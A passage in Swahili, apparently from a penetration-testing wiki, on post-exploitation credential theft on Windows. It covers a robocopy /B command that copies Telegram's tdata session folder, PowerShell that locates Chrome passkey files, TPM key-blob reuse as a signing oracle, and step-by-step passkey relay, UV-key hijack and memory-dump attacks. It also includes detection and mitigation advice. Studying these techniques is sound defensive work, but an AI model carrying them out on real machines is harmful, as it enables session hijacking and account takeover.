Kwa faili zilizofungwa wakati mfumo unaendelea kufanya kazi, tengeneza/soma **Volume Shadow Copy**; kwa faili zilizozuiwa na ACL, `robocopy /B` hutumia hali ya backup na kupuuza ACL za faili na saraka.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant inayozingatia matumizi ya bandwidth inaweza kutuma kwanza orodha ya njia za faili pekee, kupokea kitambulisho cha snapshot pamoja na njia ambazo tayari zimehifadhiwa na C2, kisha kupakia faili zinazokosekana pekee. Kwa hiyo, uhamishaji mdogo wa hatua kwa hatua baada ya kuorodhesha `tdata` kwa kujirudia bado unaweza kuashiria kuwa wizi wa session umefanikiwa.<sup>[[10]](#references)</sup>

### Utambuzi na udhibiti wa athari

Linganisha ufikiaji wa `tdata` kwa kujirudia unaofanywa na mchakato usio wa Telegram na kuwezeshwa kwa `SeBackupPrivilege`, kufunguliwa kwa faili kwa semantiki za backup, shughuli za VSS, au mchakato tanzu wa `robocopy.exe` unaotumia `/B`. Pia tafuta uorodheshaji wa haraka wa `%APPDATA%` na `%LOCALAPPDATA%\Packages`, ukifuatiwa na miunganisho ya nje kutoka kwa mchakato huohuo. Baada ya kuathiriwa, tumia **Settings → Devices** (au **Privacy & Security → Active Sessions**) kusitisha sessions usizozitambua; kuwasha uthibitishaji wa hatua mbili pekee hakufuti idhini ambayo tayari imeibiwa.<sup>[[10]](#references)[[13]](#references)</sup>

## Wizi wa vitambulisho vya Passkeys / WebAuthn kutoka Chrome kwenye Windows

Ikiwa utekelezaji wa msimbo utapatikana kama **mtumiaji mwathiriwa** kwenye kifaa cha Windows kinachotumia **Chrome + passkeys zilizosawazishwa na Google Password Manager**, passkeys huwa shabaha ya kuvutia ya post-exploitation hata **bila admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Vifaa vya ndani vinavyovutia

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** huhifadhi rekodi za **`WebauthnCredentialSpecifics`** zilizosimbwa kwa protobuf. Mchakato unaoendeshwa na mtumiaji yuleyule unaweza kubaini **RP ID**, **username**, **credential ID**, na nyenzo ya ufunguo binafsi iliyosimbwa kwa passkeys zilizosawazishwa.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** huhifadhi hali ya usajili wa kifaa cha ndani, kama vile **`wrapped_identity_private_key`** na siri iliyofungwa inayotumika kurejesha credentials zilizosawazishwa.<sup>[[4]](#references)</sup>

Uchunguzi wa haraka:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Blobu za funguo zinazofungwa na TPM bado zinaweza kutumiwa vibaya kama signing oracle ya ndani

Ikiwa kivinjari kitahamisha ufunguo wa utambulisho unaotegemea TPM kama **`NCRYPT_OPAQUE_KEY_BLOB`** na kuhifadhi blobu hiyo katika hali inayoweza kufikiwa na mtumiaji, malware **haihitaji** kutoa ufunguo ghafi wa faragha. Inaweza tu kuingiza tena blobu hiyo kwenye **mashine hiyo hiyo** na kuiomba TPM ya ndani isaini data inayodhibitiwa na mshambuliaji:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Hii inamaanisha kuwa **hardware binding huzuia export ya nje ya kifaa lakini haizuii matumizi ya mtumiaji huyo huyo kwenye endpoint iliyoathiriwa**.

### Njia za vitendo za kutumia vibaya

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Orodhesha `WebauthnCredentialSpecifics` kutoka Chrome's LevelDB.
   - Anzisha kuingia kwa passkey na upate changamoto mpya ya WebAuthn.
   - Tumia blob ya `wrapped_identity_private_key` iliyoibwa kwenye TPM ya mwathiriwa kusaini binding ya ombi la cloud-authenticator.
   - Peleka assertion iliyorejeshwa kwa relying party.
   - Hili lina manufaa hasa wakati RP inakubali `userVerification=preferred` au inaposhindwa kukataa assertions zenye **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - Lazimisha onboarding ifanyike upya kwa kufuta `passkey_enclave_state` au kwa kutuma operesheni halali iliyosainiwa ya `device/forget`.
   - Ikiwa onboarding itaacha kifaa katika hali ya **`uv_key_pending`**, sajili ufunguo wa umma wa UV unaodhibitiwa na mshambuliaji.
   - Ikiwa mtoa huduma hatathibitishi attestation / asili ya secure-hardware ya ufunguo mpya wa UV, saini za baadaye kutoka kwenye ufunguo wa mshambuliaji zitachukuliwa kuwa **`UV=1`**.
3. **Wizi wa urejeshaji wa master-secret / SDS**<sup>[[4]](#references)</sup>
   - Lazimisha urejeshaji au kujiunga tena ili Chrome ichukue master secret ya synced-passkey.
   - Fuatilia kuundwa upya/kurekebishwa kwa `passkey_enclave_state`, kisha dump kumbukumbu ya Chrome wakati maandishi wazi ya **security domain secret (SDS)** yapo kwenye kumbukumbu.
   - Tumia SDS iliyopatikana kusimbua sehemu zilizosimbwa katika kila rekodi ya `WebauthnCredentialSpecifics` na kurejesha funguo za faragha za WebAuthn zinazoweza kuhamishwa.

### Mawazo ya DFIR / utambuzi

- Fuatilia **kufutwa/kuundwa upya** kwa `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Toa tahadhari kuhusu ufikiaji usio wa kawaida wa Chrome **`Sync Data\LevelDB`** kutoka kwa michakato isiyo ya browser.
- Toa tahadhari kuhusu **dumps za kumbukumbu ya Chrome** au ufikiaji unaotiliwa shaka wa kumbukumbu kati ya michakato.
- Chunguza maombi yanayojirudia ya **PIN ya urejeshaji ya Google Password Manager** au onboarding isiyotarajiwa kufanyika tena.
- Kumbuka kuwa WebAuthn **`signCount`** mara nyingi haina manufaa kwa synced passkeys kwa sababu huenda ikabaki bila kubadilika, hivyo utambuzi wa kawaida wa cloning huwa dhaifu.

## References

- [1] [Unit 42 – Uchunguzi wa Operesheni za Miaka Kadhaa Zisizogunduliwa Zilizolenga Sekta Zenye Thamani Kubwa](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Hadaa kupitia Word VBA macro na SMTP → usimbuaji wa credential za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Jinsi Operesheni ya Kisiri ya Kihujumu Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pitisha Passkey: Eneo Jipya la Mashambulizi katika Uthibitishaji Usiohitaji Password](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / hifadhi ya funguo ya CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jinsi Hifadhi ya Data ya Active Directory Inavyofanya Kazi: Ndani ya NTDS.dit (Sehemu ya 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Dump ya Nenosiri za Lsass kwa Mbali](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho Yaongeza Zana Zake za Ujasusi wa Mtandaoni kwa Still Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Kazi ya CreateFileW na `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Hali ya backup ya Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Maswali Yanayoulizwa Mara kwa Mara ya Telegram – kusitisha sessions zinazoendelea](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard na Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Ulinzi na Usimamizi wa Credentials](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - ingizo zinazotumika na mwongozo wa kuanza haraka](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
